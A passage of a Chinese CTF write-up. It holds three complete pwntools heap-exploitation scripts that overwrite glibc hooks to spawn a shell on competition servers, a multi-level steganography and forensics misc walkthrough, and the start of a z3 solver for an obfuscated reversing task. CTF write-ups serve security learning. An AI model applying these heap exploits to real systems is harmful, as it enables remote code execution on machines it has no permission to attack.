最后一发入魂。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import*
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def menu(ch):
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Your choice: &#39;,str(ch))
</span></span><span class=line><span class=cl>def add(index,size):
</span></span><span class=line><span class=cl>	menu(1)
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Index:&#39;,str(index))
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Size: &#39;,str(size))
</span></span><span class=line><span class=cl>def edit(index,offset,size,content):
</span></span><span class=line><span class=cl>	menu(2)
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Offset: &#39;,str(offset))
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Size: &#39;,str(size))
</span></span><span class=line><span class=cl>	r.sendafter(&#39;Content: &#39;,content)
</span></span><span class=line><span class=cl>def free(index):
</span></span><span class=line><span class=cl>	menu(3)
</span></span><span class=line><span class=cl>	r.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>def openfile():
</span></span><span class=line><span class=cl>	menu(4)
</span></span><span class=line><span class=cl>def closefile():
</span></span><span class=line><span class=cl>	menu(5)
</span></span><span class=line><span class=cl>def gd(cmd=&#39;&#39;):
</span></span><span class=line><span class=cl>	gdb.attach(r,cmd)
</span></span><span class=line><span class=cl>	pause()
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#r = process(&#39;./direct&#39;)
</span></span><span class=line><span class=cl>r=remote(&#39;106.14.214.3&#39;,1912)
</span></span><span class=line><span class=cl>libc =ELF(&#39;./libc-2.27.so&#39;)
</span></span><span class=line><span class=cl>add(0,0x50)
</span></span><span class=line><span class=cl>openfile()
</span></span><span class=line><span class=cl>closefile()
</span></span><span class=line><span class=cl>add(1,0x100)
</span></span><span class=line><span class=cl>add(2,0x90)
</span></span><span class=line><span class=cl>add(3,0x90)
</span></span><span class=line><span class=cl>add(4,0x90)
</span></span><span class=line><span class=cl>edit(0,-0x10,0x10,p64(0)+p64(0x80a1))
</span></span><span class=line><span class=cl>free(0)
</span></span><span class=line><span class=cl>add(0,0xe0)
</span></span><span class=line><span class=cl>edit(1,-0x7fe8,0x50,&#39;a&#39;*0x37+&#39;b&#39;)
</span></span><span class=line><span class=cl>closefile()
</span></span><span class=line><span class=cl>r.recvuntil(&#39;aaaab&#39;)
</span></span><span class=line><span class=cl>leak=u64(r.recv(6).ljust(8,&#39;\x00&#39;))
</span></span><span class=line><span class=cl>print hex(leak)
</span></span><span class=line><span class=cl>lbase=leak-96-0x10-libc.symbols[&#39;__malloc_hook&#39;]
</span></span><span class=line><span class=cl>free(2)
</span></span><span class=line><span class=cl>free(3)
</span></span><span class=line><span class=cl>#gd()
</span></span><span class=line><span class=cl>edit(4,-0xa0,0x10,p64(lbase+libc.symbols[&#39;__free_hook&#39;]))
</span></span><span class=line><span class=cl>edit(4,0,0x10,&#39;/bin/sh&#39;)
</span></span><span class=line><span class=cl>add(5,0x90)
</span></span><span class=line><span class=cl>add(6,0x90)
</span></span><span class=line><span class=cl>edit(6,0,0x10,p64(lbase+libc.symbols[&#39;system&#39;]))
</span></span><span class=line><span class=cl>r.interactive()
</span></span></code></pre></td></tr></table></div></div><h3 id=easypwn>easypwn</h3><p>首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import*
</span></span><span class=line><span class=cl>#context.log_level =&#39;DEBUG&#39;
</span></span><span class=line><span class=cl>def menu(ch):
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Your choice:&#39;,str(ch))
</span></span><span class=line><span class=cl>def new(size):
</span></span><span class=line><span class=cl>	menu(1)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;size:&#39;,str(size))
</span></span><span class=line><span class=cl>def edit(index,content):
</span></span><span class=line><span class=cl>	menu(2)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;idx:&#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendafter(&#39;content:&#39;,	content)
</span></span><span class=line><span class=cl>def free(index):
</span></span><span class=line><span class=cl>	menu(3)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;idx:&#39;,str(index))
</span></span><span class=line><span class=cl>def F(index):
</span></span><span class=line><span class=cl>	sleep(0.05)
</span></span><span class=line><span class=cl>	p.sendline(&#39;3&#39;)
</span></span><span class=line><span class=cl>	sleep(0.05)
</span></span><span class=line><span class=cl>	p.sendline(str(index))
</span></span><span class=line><span class=cl>def E(index,content):
</span></span><span class=line><span class=cl>	sleep(0.05)
</span></span><span class=line><span class=cl>	p.sendline(&#39;2&#39;)
</span></span><span class=line><span class=cl>	sleep(0.05)
</span></span><span class=line><span class=cl>	p.sendline(str(index))
</span></span><span class=line><span class=cl>	sleep(0.05)
</span></span><span class=line><span class=cl>	p.send(content)
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>while True:
</span></span><span class=line><span class=cl>	p  = process(&#39;./main&#39;)
</span></span><span class=line><span class=cl>	libc =ELF(&#39;./libc-2.23.so&#39;)
</span></span><span class=line><span class=cl>#	p = remote(&#39;39.101.184.181&#39;,10000)
</span></span><span class=line><span class=cl>	try:
</span></span><span class=line><span class=cl>		new(0x18)	#0
</span></span><span class=line><span class=cl>		new(0x2F8)  #1
</span></span><span class=line><span class=cl>		new(0x2F8)  #2
</span></span><span class=line><span class=cl>		new(0x380)  #3
</span></span><span class=line><span class=cl>		new(0x380)  #4
</span></span><span class=line><span class=cl>		new(0x380)  #5
</span></span><span class=line><span class=cl>		new(0x380)  #6
</span></span><span class=line><span class=cl>		new(0x380)  #7
</span></span><span class=line><span class=cl>		edit(7,(p64(0) + p64(0x21))*0x38)
</span></span><span class=line><span class=cl>		new(0x18)   #8
</span></span><span class=line><span class=cl>		free(0)
</span></span><span class=line><span class=cl>		edit(1,&#39;\x00&#39;*0x2F0 + p64(0x320))
</span></span><span class=line><span class=cl>		free(2)
</span></span><span class=line><span class=cl>		####################
</span></span><span class=line><span class=cl>		new(0x18)   #0
</span></span><span class=line><span class=cl>		new(0x78)   #2
</span></span><span class=line><span class=cl>		new(0x78)   #9
</span></span><span class=line><span class=cl>		new(0xF8)   #10
</span></span><span class=line><span class=cl>		new(0x88)   #11
</span></span><span class=line><span class=cl>		new(0x68)   #12
</span></span><span class=line><span class=cl>		new(0x2F8)  #13
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		free(2)
</span></span><span class=line><span class=cl>		edit(9,&#39;\x00&#39;*0x70 + p64(0x100))
</span></span><span class=line><span class=cl>		free(10)
</span></span><span class=line><span class=cl>		new(0x78) #2
</span></span><span class=line><span class=cl>		new(0x78) #10 = 9
</span></span><span class=line><span class=cl>		new(0xF8) #14
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		free(2)
</span></span><span class=line><span class=cl>		edit(1,p64(0) + &#39;\xE8\x37\n&#39;)
</span></span><span class=line><span class=cl>		new(0x70)
</span></span><span class=line><span class=cl>		edit(1,&#39;\x00&#39;*0x78 + p64(0x1631) +  &#39;\n&#39;)
</span></span><span class=line><span class=cl>		free(9)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		E(1,&#39;\x00&#39;*0x78 + p64(0x1651) + &#39;\n&#39;)
</span></span><span class=line><span class=cl>		F(10)
</span></span><span class=line><span class=cl>		libc_base = u64(p.recvuntil(&#39;\x7F&#39;)[-6:].ljust(8,&#39;\x00&#39;)) - 131 - libc.sym[&#39;_IO_2_1_stdout_&#39;]
</span></span><span class=line><span class=cl>		log.info(&#39;LIBC:\t&#39; + hex(libc_base))
</span></span><span class=line><span class=cl>		malloc_hook = libc_base + libc.sym[&#39;__malloc_hook&#39;]
</span></span><span class=line><span class=cl>		rce = libc_base + 0xF0364
</span></span><span class=line><span class=cl>		free(12)
</span></span><span class=line><span class=cl>		edit(1,&#39;\x00&#39;*0x288 + p64(0x71) + p64(malloc_hook - 0x23) + &#39;\n&#39;)
</span></span><span class=line><span class=cl>		new(0x60) #9
</span></span><span class=line><span class=cl>		new(0x60) #10
</span></span><span class=line><span class=cl>		edit(10,&#39;\x00&#39;*0x13 + p64(rce) + &#39;\n&#39;)
</span></span><span class=line><span class=cl>		new(0x10)
</span></span><span class=line><span class=cl>		break
</span></span><span class=line><span class=cl>	except:
</span></span><span class=line><span class=cl>		p.close()
</span></span><span class=line><span class=cl>		continue
</span></span><span class=line><span class=cl>p.interactive()
</span></span></code></pre></td></tr></table></div></div><h3 id=oldschool>oldschool</h3><p>审计一下给的源文件即可知道,在mmap_edit中因为 &lt; 和 > 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset&#187;2 才是正确的offset,之后就是往free_hook写入一个system,free(&rsquo;/bin/sh&rsquo;)即可getshell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import*
</span></span><span class=line><span class=cl>context.log_level =&#39;DEBUG&#39;
</span></span><span class=line><span class=cl>def menu(ch):
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Your choice:&#39;,str(ch))
</span></span><span class=line><span class=cl>def new(index,size):
</span></span><span class=line><span class=cl>	menu(1)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Size: &#39;,str(size))
</span></span><span class=line><span class=cl>def edit(index,content):
</span></span><span class=line><span class=cl>	menu(2)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendafter(&#39;Content: &#39;,content)
</span></span><span class=line><span class=cl>def show(index):
</span></span><span class=line><span class=cl>	menu(3)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>def free(index):
</span></span><span class=line><span class=cl>	menu(4)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>def m_new(index):
</span></span><span class=line><span class=cl>	menu(6)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;start: &#39;,str(index))
</span></span><span class=line><span class=cl>def m_edit(index,value):
</span></span><span class=line><span class=cl>	menu(7)
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Index: &#39;,str(index))
</span></span><span class=line><span class=cl>	p.sendlineafter(&#39;Value: &#39;,str(value))
</span></span><span class=line><span class=cl>def m_free():
</span></span><span class=line><span class=cl>	menu(8)
</span></span><span class=line><span class=cl>p = process(&#39;./main&#39;)
</span></span><span class=line><span class=cl>libc =ELF(&#39;./libc-2.27.so&#39;)
</span></span><span class=line><span class=cl>p = remote(&#39;106.14.214.3&#39;,2333)
</span></span><span class=line><span class=cl>for i in range(8):
</span></span><span class=line><span class=cl>	new(i,0x100)
</span></span><span class=line><span class=cl>for i in range(8):
</span></span><span class=line><span class=cl>	free(7 - i)
</span></span><span class=line><span class=cl>for i in range(7):
</span></span><span class=line><span class=cl>	new(i + 1,0x100)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>show(1)
</span></span><span class=line><span class=cl>p.recvuntil(&#39;Content: &#39;)
</span></span><span class=line><span class=cl>heap_base = u32(p.recv(4)) - 0x380
</span></span><span class=line><span class=cl>log.info(&#39;HEAP:\t&#39; + hex(heap_base))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>new(0,0x78)
</span></span><span class=line><span class=cl>new(8,0x78)
</span></span><span class=line><span class=cl>edit(1,&#39;/bin/sh\n&#39;)
</span></span><span class=line><span class=cl>show(0)
</span></span><span class=line><span class=cl>libc_base = u32(p.recvuntil(&#39;\xF7&#39;)[-4:]) - libc.sym[&#39;__malloc_hook&#39;] - 0xD8
</span></span><span class=line><span class=cl>system = libc_base + libc.sym[&#39;system&#39;]
</span></span><span class=line><span class=cl>free_hook = libc_base + libc.sym[&#39;__free_hook&#39;]
</span></span><span class=line><span class=cl>log.info(&#39;LIBC:\t&#39; + hex(libc_base))
</span></span><span class=line><span class=cl>rce = libc_base + 0x3D130
</span></span><span class=line><span class=cl>m_new(0)
</span></span><span class=line><span class=cl>address = ((free_hook - 0xE0000000)&gt;&gt;2)
</span></span><span class=line><span class=cl>m_edit(address,system)
</span></span><span class=line><span class=cl>free(1)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p.interactive()
</span></span></code></pre></td></tr></table></div></div><h2 id=misc>Misc</h2><h3 id=miscstudy>miscstudy</h3><p><img src=https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png alt></p><p>找到一个访问 http://39.99.247.28/fonts/1 的流量</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_7456417605938132686ff20660e7d9ff.png alt></p><p>得到flag{level1_begin_and_level2_is_come</p><p>还从中得到了私钥信息，将其导入Wireshark可以解密后续的部分TLS流量。</p><p>继续往后翻stream，可以发现一个图片：
<img src=https://hackmd.summershrimp.com/uploads/upload_d374609201cbd3daf43e87e452f03c30.png alt></p><p>访问 <a href=https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png>https://www.qiangwangbei.com/images/4e5d47b2db53654959295bba216858932.png</a> 下载图片</p><p>在末尾能看到一串类似base64编码的字符串：</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_96ed59c4dba7593974234283b98b6ca3.png alt></p><p>解码得到level3_start_it</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png alt></p><p>在文件末尾的上面，也能发现3串base64编码后的字符串，对其分别解码后得到一串长度为3600的01字符串，按照每60个一行，可以得到一个二维码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=mi>60</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>=</span> <span class=mi>60</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>black</span> <span class=o>=</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>white</span> <span class=o>=</span> <span class=p>(</span><span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>255</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001111111111110000000100110000100000000011100001111111111100001111111111110000000110111000100000000011100001111111111100001100000000110010011111110010000000001100111001000000000100001100000000110010000110110010000000000001111001000000000100001100111100110010000100110010011100000011101001001111100100001100111100110000100000001110011111110010000001001111100100001100111100110000000000001110011110110010000001001111100100001100111100110011100100111111111100110011100000001111100100001100000000110011000000000111100110110110000001000000000100001100000000110010011000000011100011111110011001000000000100001111111111110010011001001001100110110010011001111111111100001111111111110010011001001100000100110010011001111111111100000000000000000010011111110010011000111000100000000000000000000000000000000010001111100010011000011101100000000000000000001110011000111100000001000000011000001111111001111000111000000110000000000000000001000000011000000000011001000000000000000010000001000011100001000000111100110000011000000010000000001110011001111110000000000000010001001110011111000010011000001110011001111110000000000000011001001110011111000010011000001100111000000011111000000010000100000100100111000000100100000001100000000111011000000111000100001100000111000000000000000011100000111110011000001111111100001100011111110010000000000000111001001100000000001100000111001110011111001000100100000000111001001000000000001000000111001110011111001100100100000011100000110011111111000000011100001111111000001110011100000011000000010011111110000000011100001111111000000110001100000000000100000010000000000000011000001110011001000000100100000000000000000110000000000000000000001110011011100000000000000010001001111110000100000000100000011111111101111100000000000011000000001110000000111111100110000001100000000010000000000011100000001110000000111111100111000000100000000010000000001110000100111111111111000000011100111000011000001100000000001111000110001001100111000000011000011100011000000000000000001111100111001100100101111111111001111100001001110011111100001100000111110000100000000010000000111100011000000011100100001000000111110000100000000010000000111000011000000011100100000011011100000011100000000000000001110000011111000001100100000111111100000011000000000000000011100000001101000000100100001111100000110010000100000000011111000010000000001100010000000111100000000010000110000000000000000110000000001100000000000011100100000010011111000011100000001110000000111000100000001100111000111110011111001111111100001010011111111100011000001000111000111110011111001111111100001110011011111100011000000000000000000010011001001110000001110001111000001100000100000000000000000010011000001100000000110000011000001100000100001111111111110010011000111000110000111100011001001100111100001100000000110000111100000011111111001110001000001100111000001100000000110000111100000011111111001110011000001100111000001100111100110000100001000000100001001110011111111100000000001100111100110000100001000001100001001100001111111000000000001100111100110010011000111111111000111110000111000011011100001100111100110000011000110000000000000110000000000011011100001100111100110000011111110000000100001110011000000000011100001100000000110011100100111000011001111100011111111111100000001100000000110011100100111000011001111100011111111111100000001011111111010010011111110011111001001110011111100000011000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#34;</span>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;RGB&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=n>j</span><span class=o>*</span><span class=mi>60</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;0&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>),</span> <span class=n>white</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>i</span><span class=p>,</span><span class=n>j</span><span class=p>),</span> <span class=n>black</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl><span class=n>img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png alt></p><p>扫描得到
链接：https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug 提取码：1lms</p><p>下载得到level4.zip</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png alt></p><p>stegbreak，密码power123</p><p>JPHS提取得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
</span></span><span class=line><span class=cl>mrpt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>level4_here_all
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png alt></p><p>level5_is_aaa</p><p>level6.zip中有3个txt文件，crc爆破得到level6_isready</p><p>level7.zip明文碰撞1.png，再水印隐写可以得到level7ishere和39.99.247.28/final_level/</p><p>源码里看到</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_f6df4e39c4e1ca6dcb47e51e2d442ff5.png alt></p><p>Snow隐写 解密得到the_misc_examaaaaaaa_!!!}</p><p>flag{level1_begin_and_level2_is_comelevel3_start_itlevel4_here_alllevel5_is_aaalevel6_isreadylevel7isherethe_misc_examaaaaaaa_!!!}</p><h2 id=rev>Rev</h2><h3 id=xx_warmup_obf>xx_warmup_obf</h3><p>ELF逆向，里面全是混淆，使用pin改了一个插件出来，可以用来统计运行过的指令地址，编写idapython，将未运行的指令patch成nop，可以看到程序多了很多函数，大概流程就是：输入，判断长度28，然后进入到一个解方程的地方，解方程即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># -*- coding: UTF-8 -*-
</span></span><span class=line><span class=cl>from z3 import *
</span></span><span class=line><span class=cl>s = Solver()
</span></span><span class=line><span class=cl>key = [BitVec(&#39;%d&#39;%i,8) for i in range(28)]
</span></span><span class=line><span class=cl>s.add(key[0] == ord(&#39;f&#39;))
</span></span><span class=line><span class=cl>s.add(key[1] == ord(&#39;l&#39;))
</span></span><span class=line><span class=cl>s.add(key[2] == ord(&#39;a&#39;))
</span></span><span class=line><span class=cl>s.add(key[3] == ord(&#39;g&#39;))
</span></span><span class=line><span class=cl>s.add(key[4] == ord(&#39;{&#39;))
</span></span><span class=line><span class=cl>s.add(key[27] == ord(&#39;}&#39;))
</span></span><span class=line><span class=cl>s.add(key[23] == ord(&#39;_&#39;))
</span></span><span class=line><span class=cl>s.add(23925 * key[0] == 2440350)
</span></span><span class=line><span class=cl>s.add(281400 * key[1] - 7037 * key[0] == 29673426)
</span></span><span class=line><span class=cl>s.add(174826 * key[0] - 255300 * key[2] - 283573 * key[1] == -37557732)
</span></span><span class=line><span class=cl>s.add( 259881 * key[2] + -98445 * key[1] - 276718 * key[0] + 4524 * key[3] == -13182867 )
</span></span><span class=line><span class=cl>s.add( 285576 * key[2] + -274569 * key[3] + 94721 * key[0] - 228216 * key[4] - 60353 * key[1] == -25506885 )
</span></span><span class=line><span class=cl>s.add( 17630 * key[0]+ -258397 * key[3]+ -244952 * key[1]+ -244086 * key[2]+ -130259 * key[5]- 190371 * key[6]- 109961 * key[4] == -111027477 )
